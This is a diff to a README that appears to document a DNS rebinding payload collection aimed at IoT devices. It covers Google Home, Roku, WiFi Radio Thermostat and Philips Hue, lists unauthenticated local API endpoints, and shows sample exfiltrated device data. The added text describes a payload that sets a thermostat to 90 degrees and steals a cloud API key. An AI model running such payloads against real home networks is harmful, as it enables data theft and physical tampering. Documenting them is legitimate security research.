@@ -4,7 +4,8 @@ The `payloads/` folder contains a small collection of payloads written for commo
 
 - `google-home.html`: A payload that targets [Google Home's undocumented REST API](https://rithvikvibhu.github.io/GHLocalApi/). This API is supported by several Google Home products, like Chromecast, certain smart TVs, and of course the Google Home and Google Home Mini.
 - `roku-info.html`: [Roku's External Control API](https://sdkdocs.roku.com/display/sdkdoc/External+Control+API) allows direct control over the device via an unauthenticated REST API. There is plenty of fun to be had here.
-- `radio-thermostat.html`: 
+- `radio-thermostat.html`: The [WiFi Radio Thermostat CT50 & CT80](https://github.com/brannondorsey/radio-thermostat) don't require [any authentication](https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2013-022/?fid=3870) to their REST APIs. This payload exploits this vulnerability and sets the building temperature to 90 degrees and exfiltrates a cloud API key.
+- `phillips-hue.html`: Detect the presence of a Phillips Hue Bridge lighting system and exfiltrate basic information about the device.
 
 ## Google Home
 
@@ -40,7 +41,10 @@ http://192.168.1.88:8060:query/device-info
 # get a list of all apps on the device
 http://192.168.1.88:8060:query/apps
 ```
+
 Full device control is available over this API. You can open apps, play content, and control keypresses. I'll leave it up to someone else to write experiment with this functionality ;) PRs welcome!
+
+Here is an example of Roku data exfiltrated using [`payloads/roku-info.html`](https://pastebin.com/WSv5egcY).
 
 **Note**: The exfiltrated data is served as XML from the Roku device, but converted to JSON by `share/xmlToJSON.min.js`. It's not pretty, but I opted for JSON consistency across exfiltrated data in this repo. A custom payload could easily be written to preserve the original XML.
 
@@ -80,4 +84,61 @@ http://192.168.1.209/cloud
 http://192.168.1.209/tstat
 ```
 
+The data exfiltrated by `payloads/radio-thermostat.html` is saved to `data/` and looks like this:
+
+```json
+{
+    "uuid": "2002af759f67",
+    "api_version": 113,
+    "fw_version": "1.04.84",
+    "wlan_fw_version": "v10.105576",
+    "name": "TotallySecureThermostat",
+    "ssid": "myWiFiNetwork",
+    "bssid": "79:8e:cd:87:2c:38",
+    "channel": 11,
+    "security": 4,
+    "ip": 1,
+    "rssi": -33,
+    "interval": 300,
+    "url": "http://ws.radiothermostat.com/services.svc/StatIn",
+    "status": 0,
+    "enabled": 0,
+    "authkey": "",
+    "status_code": 0,
+    "temp": 73.5
+} 
+```
+
 See [brannondorsey/radio-thermostat](https://github.com/brannondorsey/radio-thermostat) for full documentation of this REST API.
+
+## Phillips Hue Bridge
+
+Up until 2016 the Phillip's Hue Bridge wireless light bulb controller could easily be controlled by an unauthenticated attacker. They've since updated their firmware to protect against this. While you can no longer control the device via a DNS rebinding attack you can still identify that a hue bridge is on the network and exfiltrate basic information about the device.
+
+```bash
+# assuming a phillips hue bridge device is present at 192.168.1.8
+
+# get basic info about the device. Best I can tell this is the only API endpoint
+# that can be accessed by an unauthenticated user. Authentication requires
+# physical access.
+http://192.168.1.8/api/nouser/config
+```
+
+The data exfiltrated by `payloads/phillips-hue.html` is saved to `data/` and looks like this:
+
+```json
+{
+    "name": "Philips hue",
+    "datastoreversion": "70",
+    "swversion": "1802201122",
+    "apiversion": "1.24.0",
+    "mac": "00:17:88:6f:a5:91",
+    "bridgeid": "001788FFFD69A591",
+    "factorynew": false,
+    "replacesbridgeid": null,
+    "modelid": "BSB002",
+    "starterkitid": ""
+}
+```
+
+
